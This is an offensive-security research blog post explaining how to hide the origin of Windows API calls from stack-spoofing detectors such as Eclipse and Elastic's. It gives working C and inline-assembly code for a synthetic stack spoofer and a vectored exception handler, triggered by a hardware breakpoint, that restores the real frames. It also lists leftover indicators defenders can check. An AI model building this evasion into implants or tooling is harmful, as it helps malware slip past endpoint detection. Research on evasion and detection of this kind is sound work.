---
title: "Using Vectored Exception Handlers to Restore Spoofed Stack Frames"
headline: "Using VEH to Restore Spoofed Stack Frames"
thumbnail: /assets/img/20260601/thumbnail.png
---

# Introduction

This blog will go over using VEH (Vectored Exception Handlers) to restore spoofed stack frames, with the goal of getting around ROP-based (Return Oriented Programming) stack spoofing dectections.

While the contents of this blog are not novel, it's a good exercise in understanding the interplay between offensive techniques and defensive strategies.

# Background & Indicator

Active Stack Spoofing techniques rely on control flow desynchronization to clean up their spoofed frames and restore control flow of the original modules.

A popular way of doing this was by:

**Step 1:** loading the address of a "cleanup" assembly stub into a nonvolatile register.

**Step 2:** finding a jump gadget within a legitimate module which will redirect execution into that nonvolatile register.

**Step 3:** pushing a stack frame that will return into the jump gadget.

Checking for return addresses on the stack that were not preceeded by a call instruction became a high-fidelity IoC (Indicator of Compromise) of ROP-based desynchronization, pioneered by [Eclipse](https://youtu.be/_2lH90C2nOM?si=vpEKwNBsqGQQiOzB&t=1016), and later added as part of [Elastic's](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware) stack spoofing detection strategy.

Let's explore known techniques which eliminate this IoC.

# Existing Approaches

KlezVirus's (Alessandro Magnosi's) approach to evading ROP-based dectection in [Moonwalk++](https://klezvirus.github.io/posts/Moonwalk-plus-plus/) is very clean: the gadget-hunting logic was improved to simply find jump gadgets which are preceeded by a call instruction.

Klez also made [Half-Moonwalk](https://youtu.be/M7crU7fKx3k?si=2TPJAKTZl5tU0MvT&t=1420), whose purpose was to creates synthetic frames for indirect system calls, so the syscall looks like it was called from a high level API. Pushing a desynchronization frame would have broken the "natural" flow of the high level API call, so he set hardware breakpoints on every return address, and ran the epilogues associated with each function from within a VEH. It requires re-applying ("sliding") the breakpoints from address to address as an exception must be raised from each return address on the stack. However it dosent rely on gadgets and so, dosent produce the ROP IoC.

Another project which dosent use jump gadgets is [CallStackSpoofer](https://github.com/WithSecureLabs/CallStackSpoofer/tree/master), created by William Burgess while he was at WithSecureLabs. To apply fake frames, it initializes a new suspended thread and modifies its `CONTEXT` to show a custom call stack, and to send execution into to an API call. When the API call returns into the mismatching call stack, a VEH handles the inevitable exception and kills the thread.

Burgess mentioned in his post that the technique could be improved by using VEH and breakpoints to re-use the same thread for multiple API calls instead of creating a new one each time. I found that to be an interesting idea because it would be a less messy way to restore the stack without reliance on ROP frames.

# The Modified Approach

To try and build this setup, we start with a traditional synthetic stack spoofer, figure out its impact on `rsp` and other nonvolatile registers, and create and register a VEH that can undo its impact. Then we place a hardware breakpoint (HWBP) on the return address of the topmost spoofed frame.

# Constraints & Assumptions

These are the constraints and assumptions I place on this post to to keep it focused and engaging:

- We wont be caring about what our spoofed origin frames actually are, as changing those are not architectural problems.
- We will be creating synthetic frames so this blog won't be relevant to HSP (Hardware Stack Protection) enabled systems.
- We will be truncating the stack for simplicity.
- We are not creating it as PIC (am lazy).
- Our goal will be to preform Stack Spoofing to hide origin frames, without being flagged by ROP-based dectection algorithms (Eclipse).
- I do not care about any other IoCs (of which there are many).

# In Practice

Below is a basic stack spoofer which creates space for a fake stack, truncates it, creates two fake origin frames, sets `rsp` to the fake stack, and executes a function call with four arguments:

```c
typedef struct _FRAME_INFO {
    DWORD64 frameSize;
    PVOID returnAddress;
} FRAME_INFO, * PFRAME_INFO;

__attribute__((naked)) PVOID fourArgAsmCall(
	DWORD64 arg1,			  // [rsp + 0x00]
	DWORD64 arg2,			  // [rsp + 0x08]
	DWORD64 arg3,			  // [rsp + 0x10]
	DWORD64 arg4, 			  // [rsp + 0x18]
	DWORD64 functionPointer,  // [rsp + 0x20]
	PFRAME_INFO frameInfo	  // [rsp + 0x28]
) {
    asm(
    
	// we need to save r14, r15, rdi, and the original stack pointer
	"push r14\n" 	 // save r14
	"push r15\n" 	 // save r15
	"push rdi\n" 	 // save rdi	  
	"mov rdi, rsp\n" // save original rsp
	
	// bring rsp back to before we pushed 3 regs on it
	"add rsp, 0x18\n" 
	"pop rax\n"
	
	// ---  
	
	"mov r10, rsp\n"    // hold spoofed rsp in r10 so we can still use rsp to access arguments
	"sub r10, 0x3000\n" // make tons of space for frames
	
	// truncate the stack
	"xor r11, r11\n"
	"mov [r10], r11\n"
	
	// ---
	
	"mov r11, [rsp + 0x28]\n" // make r11 to point to PFRAME_INFO	
	"mov r11, [r11]\n" // dereference makes it point to FRAME_INFO array
	
	// create frame space
	"sub r10, [r11]\n"
	"sub r10, 0x8\n"
	
	// move r11 to point to address of return address
	"add r11, 0x8\n"
	
	// move the return address onto our fake stack
	"mov r14, [r11]\n"
	"mov [r10], r14\n"
	
	// ---
	
	// move r11 to point to size of next stack frame
	"add r11, 0x8\n"
	
	// create frame space	
	"sub r10, [r11]\n"
	"sub r10, 0x8\n"
	
	// move r11 to point to address of return address of stack frame
	"add r11, 0x8\n"
	
	// move the return address onto our fake stack
	"mov r14, [r11]\n"
	"mov [r10], r14\n"
	  
	// ---
	
	"mov r15, [rsp + 0x20]\n" // grab location to jump to before clobbering rsp
	"mov rsp, r10\n" // use spoofed stack
	"jmp r15\n" // execute
    
    );
}
```

In this spoofer, the following instructions made modifications to nonvolatile registers:

```c
"push r14\n"
"push r15\n"
"push rdi\n"
"mov rdi, rsp\n"
```

And the following instructions would undo that impact:

```c
mov rsp, rdi
pop r15
pop r14
pop rdi
ret
```

These instructions are easily translated into a VEH that modifies `CONTEXT` to apply those changes.

```c  
LONG WINAPI VectoredHandler(PEXCEPTION_POINTERS pExceptionInfo) {
	
    /*
    mov rsp, rdi
    pop rdi
    pop r15
    pop r14
    ret
    */

    printf("[+] exception raised\n");
    
    PCONTEXT context = pExceptionInfo->ContextRecord;

    // 1. mov rsp, rdi
    context->Rsp = context->Rdi;
  
    // 2. pop rdi
    context->Rdi = *(PDWORD64)context->Rsp;
    context->Rsp += sizeof(DWORD64);

    // 3. pop r15
    context->R15 = *(PDWORD64)context->Rsp;
    context->Rsp += sizeof(DWORD64);

    // 4. pop r14
    context->R14 = *(PDWORD64)context->Rsp;
    context->Rsp += sizeof(DWORD64);

    // 5. ret
    context->Rip = *(PDWORD64)context->Rsp;
    context->Rsp += sizeof(DWORD64);

    printf("[+] stack spoofing undone\n");
    printf("[+] continuing execution\n");

    return EXCEPTION_CONTINUE_EXECUTION;
}
```

Finally, to raise an exception, a HWBP is placed on the last `returnAddress` that was in the `frameInfo` array.

Testing it out, we can see that while the synthetic frames are active, Eclipse does not pick it up.

| ![figure1.PNG](/assets/img/20260601/figure1.PNG) |
| :---: |
| **Figure 1:** Eclipse Scanning the Spoofed Stack | 

After the API call returned, the HWBP raised an exception, then the VEH handles it and restores execution back to normal within the same thread. Note how the real origin modules become visible.

| ![figure2.PNG](/assets/img/20260601/figure2.PNG) |
| :---: |
| **Figure 2:** Execution Returning to Normal Within the Same Thread | 

# Even More Indicators

The `CrossProcessFlags` bitmask within the Process Environment Block will indicate if a process has VEHs active.

The VEH's code will still need to live in private executable memory.

# Conclusion

Was a lot of fun. Feel free to reach out with comments or questions. I love to learn and recognize that these concepts go extremely deep; so if I made errors, I'd love to know.

Code associated with this post is [here](https://github.com/ToBeatElite/musical-octo-eureka/).

# Awesome Resources

Klez and his friends have done so much work in this space.
- [SilentMoonWalk & ECLISPE by KlezVirus, Waldo-IRC, Trickster0](https://github.com/klezVirus/SilentMoonwalk#authors)
- [Half-Moonwalk by KlezVirus](https://youtu.be/M7crU7fKx3k?si=2TPJAKTZl5tU0MvT&t=1420)

Moonwalk++ also by Klez is especially interesting as he gives great insight into the potential of fragility within dectections.
- [Moonwalk++ by KlezVirus](https://klezvirus.github.io/posts/Moonwalk-plus-plus/)

Burgess had the idea that I tried building in this blog like 4 years ago.
- [CallStackSpoofer/VulncanRaven by William Burgess](https://labs.withsecure.com/publications/spoofing-call-stacks-to-confuse-edrs)

Great insight into how a commercial EDR might collect, enrich, and process call stack telemetry to generate high-fidelity dectections.
- [Call Stacks: No More Free Passes For Malware by John Uhlmann at Elastic](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)

Nice blog about stack spoofing and my first introduction to it.
- [An Introduction into Stack Spoofing by Dylan Tran](https://dtsec.us/2023-09-15-StackSpoofin/)
